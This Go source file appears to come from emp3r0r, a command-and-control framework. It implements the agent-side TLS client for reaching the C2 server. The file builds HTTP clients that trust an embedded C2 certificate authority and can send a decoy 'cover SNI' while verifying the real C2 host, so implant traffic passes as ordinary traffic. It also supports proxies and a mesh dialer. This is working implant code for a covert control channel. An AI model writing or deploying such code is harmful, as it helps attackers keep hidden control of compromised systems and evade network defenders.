//go:build no_utls

package transport

// tls_stdlib.go is the crypto/tls client used when the build excludes the uTLS
// dependency (tag "no_utls"). It preserves the uTLS client's contract: trust
// the C2 CA, optionally send a cover SNI while still verifying the server
// certificate against the real C2 host, and honour a configured proxy and the
// mesh dialer hook.

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

// stdlibTLSConfig mirrors uTLS's ServerName/InsecureServerNameToVerify pair.
func stdlibTLSConfig(c2Host string, rootCAs *x509.CertPool) *tls.Config {
	sni, verifyName := c2ServerNames(c2Host)
	cfg := &tls.Config{
		ServerName:       sni,
		RootCAs:          rootCAs,
		MinVersion:       tls.VersionTLS12,
		CurvePreferences: []tls.CurveID{tls.CurveP256, tls.X25519},
	}
	if verifyName != "" {
		// A cover SNI is configured: send it, but verify the certificate
		// chain against the real C2 host rather than the cover name.
		cfg.InsecureSkipVerify = true
		cfg.VerifyConnection = func(cs tls.ConnectionState) error {
			opts := x509.VerifyOptions{
				DNSName:       verifyName,
				Roots:         rootCAs,
				Intermediates: x509.NewCertPool(),
			}
			for _, cert := range cs.PeerCertificates[1:] {
				opts.Intermediates.AddCert(cert)
			}
			_, err := cs.PeerCertificates[0].Verify(opts)
			return err
		}
	}
	return cfg
}

// CreateEmp3r0rHTTPClient returns an HTTP client that trusts the embedded C2 CA
// and verifies the C2 against the configured real host, using crypto/tls.
func CreateEmp3r0rHTTPClient(c2_addr, proxyServer string) *http.Client {
	rootCAs, err := ExtractCABundle(CACrtPEM)
	if err != nil {
		logging.Fatalf("ExtractCABundle: %v", err)
	}

	addr := c2_addr
	if !strings.HasPrefix(addr, "http") {
		addr = "https://" + addr
	}
	c2url, err := url.Parse(addr)
	if err != nil {
		logging.Fatalf("Error parsing C2 address '%s': %v", addr, err)
	}

	if ok := rootCAs.AppendCertsFromPEM(CACrtPEM); !ok {
		logging.Fatalf("No CA certs appended")
	}

	c2_host := c2url.Hostname()
	ca_crt, _ := ParsePem(CACrtPEM)
	logging.Infof("CA cert fingerprint: %s, now making HTTP transport", sha256SumRaw(ca_crt.Raw))

	var proxyFunc func(*http.Request) (*url.URL, error)
	if proxyServer != "" {
		logging.Infof("Using proxy server: %s", proxyServer)
		proxyUrl, e := url.Parse(proxyServer)
		if e != nil {
			logging.Fatalf("Invalid proxy: %v", e)
		}
		proxyFunc = http.ProxyURL(proxyUrl)
	}

	// For plain HTTP, there is no TLS to camouflage.
	if c2url.Scheme == "http" {
		logging.Infof("Using plain HTTP client for %s", c2url)
		tr := httpRoundTripper.Clone()
		tr.Proxy = proxyFunc
		return &http.Client{Transport: tr}
	}

	dialContext := (&net.Dialer{Timeout: 10 * time.Second}).DialContext
	tr := &http.Transport{
		Proxy:             proxyFunc,
		TLSClientConfig:   stdlibTLSConfig(c2_host, rootCAs),
		ForceAttemptHTTP2: true,
		DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
			if GlobalMeshDialer != nil {
				return GlobalMeshDialer(ctx, network, addr)
			}
			return dialContext(ctx, network, addr)
		},
	}

	logging.Infof("Transport initialized (%s)", c2url)
	return &http.Client{Transport: tr}
}

// CreatePreflightHTTPClient creates a lightweight HTTPS client for preflight
// checks, trusting only the C2 CA.
func CreatePreflightHTTPClient(c2Addr string) *http.Client {
	addr := c2Addr
	if !strings.HasPrefix(addr, "http") {
		addr = "https://" + addr
	}
	c2url, err := url.Parse(addr)
	if err != nil {
		logging.Infof("Error parsing C2 address '%s': %v", addr, err)
		return nil
	}

	rootCAs, err := ExtractCABundle(CACrtPEM)
	if err != nil {
		logging.Infof("ExtractCABundle: %v", err)
		return nil
	}

	tr := &http.Transport{
		TLSClientConfig:   stdlibTLSConfig(c2url.Hostname(), rootCAs),
		ForceAttemptHTTP2: true,
	}

	return &http.Client{
		Transport: tr,
		Timeout:   30 * time.Second,
	}
}
